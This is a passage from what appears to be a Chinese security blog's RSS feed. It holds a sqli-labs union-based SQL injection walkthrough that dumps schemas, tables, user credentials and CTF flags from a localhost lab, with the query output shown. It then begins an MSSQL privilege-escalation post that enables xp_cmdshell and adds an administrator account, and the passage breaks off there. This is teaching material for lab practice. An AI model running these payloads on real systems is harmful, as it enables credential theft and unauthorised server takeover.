&lt;p&gt;注意，这里的 1,2,3 可以填任何数字或者符号，仅仅为了占位使用，&lt;strong&gt;可以被任意 “想要看到的输出内容” 覆盖&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;经过多次定位，我们最终得到：&lt;strong&gt;前面的查询&lt;/strong&gt;使用到的是&lt;strong&gt; 3 个列&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928225313035.png&#34; alt=&#34;image-20220928225313035&#34;&gt;&lt;/p&gt;
&lt;p&gt;因此有：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, schema_name &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.schemata #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928225608030.png&#34; alt=&#34;image-20220928225608030&#34;&gt;&lt;/p&gt;
&lt;p&gt;虽然正确显示，但是我们查询的内容并没有显示出来。这是因为，使用 union 查询，&lt;strong&gt;还有个 bug&lt;/strong&gt; 就是如果前面的查询有效，&lt;strong&gt;最终结果会在前面查询到的结尾后面拼接&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;为了让后面查询到的内容（我们 &lt;code&gt;想要看到的数据&lt;/code&gt; ）提前，&lt;strong&gt;我们需要令前面的查询失效&lt;/strong&gt;，简单的方法就是令 id = 39888 这样平常不会使用的奇怪数字：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;39888&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, schema_name &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.schemata #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928225926603.png&#34; alt=&#34;image-20220928225926603&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;2拼接多组内容在同一行输出-寻找所在库&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2拼接多组内容在同一行输出-寻找所在库&#34;&gt;#&lt;/a&gt; 2）拼接多组内容在同一行输出、寻找所在库&lt;/h4&gt;
&lt;p&gt;OK，我们在第二个占位符（也就是数字 2 所在的位置）上，看到输出了一个 schema_name，但是我们想要输出所有的 schema_name，怎么办？&lt;/p&gt;
&lt;p&gt;使用 MySQL 查询语句提供的 group_concat () 函数&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;39888&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, group_concat(schema_name), schema_name &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.schemata #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以看到，原本占位符 2 所在的位置，已经被一组输出内容所替换。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928230746841.png&#34; alt=&#34;image-20220928230746841&#34;&gt;&lt;/p&gt;
&lt;p&gt;除了 group_concat ()，我们还可以使用：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#输出当前使用数据库的名称&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;database() &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#输出当前服务器中使用数据库的用户的名字和其对应的主机&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#输出当前数据库版本号&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;version()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#输出该服务器数据库安装路径（数据库安装在哪里）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@&lt;span class=&#34;variable&#34;&gt;@basedir&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#输出数据库中数据的存放路径（该存放路径下有各个数据库的数据、数据库中表的数据）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@&lt;span class=&#34;variable&#34;&gt;@datadir&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#输出操作系统的版本号&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@&lt;span class=&#34;variable&#34;&gt;@version&lt;/span&gt;_compile_os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#md5(str)可以对传入的字符串进行，d5加密，并返回加密后得到的&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;位字符串。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;md5(&lt;span class=&#34;string&#34;&gt;&amp;#x27;xxxx&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#使用某个拼接符如“:”来拼接str1和str2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;concat_ws(&lt;span class=&#34;string&#34;&gt;&amp;#x27;:&amp;#x27;&lt;/span&gt;, str1, str2)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接着我们查询所在数据库的名字：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;39888&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, group_concat(schema_name), database() &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.schemata #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;哦，原来是在 security 数据库中&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928231402676.png&#34; alt=&#34;image-20220928231402676&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;3确定想从某个库中拿到什么表从表中拿到什么列&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3确定想从某个库中拿到什么表从表中拿到什么列&#34;&gt;#&lt;/a&gt; 3）确定想从某个库中拿到什么表，从表中拿到什么列&lt;/h4&gt;
&lt;p&gt;我们看看从 security 库中都可以读取什么表？&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;核心&lt;/strong&gt; —— 在&lt;strong&gt; information_schema 库&lt;/strong&gt;的&lt;strong&gt; Tables 表&lt;/strong&gt;中，查询当 table_schema 的值为我们刚刚获取的 security 库时&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;39888&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, group_concat(table_name), database() &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.tables &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; table_schema &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; database() #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928231639522.png&#34; alt=&#34;image-20220928231639522&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;获取到 security 库中的所有表为&lt;/strong&gt;： &lt;code&gt;emails&lt;/code&gt; 、 &lt;code&gt;referers&lt;/code&gt; 、 &lt;code&gt;uagents&lt;/code&gt; 、 &lt;code&gt;users&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我们比较关心账号密码相关，所以眼光聚焦到 users 表。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;核心&lt;/strong&gt; —— 在&lt;strong&gt; information_schema 库&lt;/strong&gt;的&lt;strong&gt; Columns 表&lt;/strong&gt;中，查询当&lt;strong&gt; table_schema&lt;/strong&gt; 的值为我们刚刚获取的 &lt;code&gt;security&lt;/code&gt;  且 &lt;strong&gt;table_name&lt;/strong&gt; 为 &lt;code&gt;users&lt;/code&gt;  时&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;39888&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, group_concat(column_name), database() &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.columns &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; table_schema &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; database() &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; table_name &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;users&amp;#x27;&lt;/span&gt; #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;获取到 security 库中，users 表里所有列为&lt;/strong&gt;： &lt;code&gt;id&lt;/code&gt; 、 &lt;code&gt;username&lt;/code&gt; 、 &lt;code&gt;password&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928232355430.png&#34; alt=&#34;image-20220928232355430&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们想要获取 username 和 password 的全部对应关系，使用 concat_ws 函数，把 username 和 password 用冒号拼接起来：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;核心&lt;/strong&gt; —— 由于已经知道了所在&lt;strong&gt; security 库&lt;/strong&gt;，&lt;strong&gt;users 表&lt;/strong&gt;，因此直接 &lt;code&gt;select xxxx from security.users&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;39888&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, group_concat(concat_ws(&lt;span class=&#34;string&#34;&gt;&amp;#x27;:&amp;#x27;&lt;/span&gt;, username, password)), &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; security.users #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928232842359.png&#34; alt=&#34;image-20220928232842359&#34;&gt;&lt;/p&gt;
&lt;p&gt;小练习&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#&lt;span class=&#34;number&#34;&gt;1.&lt;/span&gt;查看注入类型&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;SQLC&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-1.&lt;/span&gt;php&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;SQLC&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-1.&lt;/span&gt;php&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; # 报错(整型和单引号都会报错)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#2.确定整型注入&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-1.php/?id=1 # (只有整型不会报错)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----结果-----&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: kevin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: Kevin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#3.确定列数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-1.php/?id=1 union select 1, 2, 3 #&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----结果-----&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: kevin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: Kevin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#4.构造联合查询,确定所在库名。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), schema_name from information_schema.schemata #&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----结果-----&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: challenge&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: information_schema&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#5.确定在这个库中，都有什么表&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), group_concat(table_name) from information_schema.tables where table_schema = database()#&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----结果-----&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: challenge&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: emails,flag,users&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#6.确定我们要找flag表，并看这个表中有什么列&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = &amp;#x27;&lt;/span&gt;flag&lt;span class=&#34;string&#34;&gt;&amp;#x27;#&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----结果-----&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: challenge&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: flag,value&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#7.取列的值，另外把查询的from 后面改成对应的&amp;quot;库.表&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-1.php/?id=2356 union select 1,database(), group_concat(concat_ws(&amp;#x27;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;#x27;, flag, value)) from challenge.flag#&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----结果-----&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: challenge&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: flag1:mars,flag2:coobe,flag3:gir,flag4:margin,flag5:tubi,flag6:xss,flag7:any,flag8:sqlc,flag9:tasi,flag10:moo,flag12:false,flag11:muse&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;至此，整型注入演示完毕。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/MSSQL%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/</guid>
            <title>MSSQL提权攻击</title>
            <link>https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/MSSQL%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/</link>
            <category>数据库安全</category>
            <pubDate>Tue, 27 Sep 2022 22:46:06 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;sql-servermssql提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql-servermssql提权&#34;&gt;#&lt;/a&gt; SQL Server（MSSQL）提权&lt;/h1&gt;
&lt;p&gt;总结一下，下文使用有效命令全部为：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;--1.xp_cmdshell提权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;xp_cmdshell&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#master..xp_cmdshell的全写是master.dbo.xp_cmdshell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;net user HeyJack HeyJack /add&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;net localgroup administrators HeyJack /add&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;ipconfig&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;type C:\Documents and Settings\桌面\flag.txt&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span 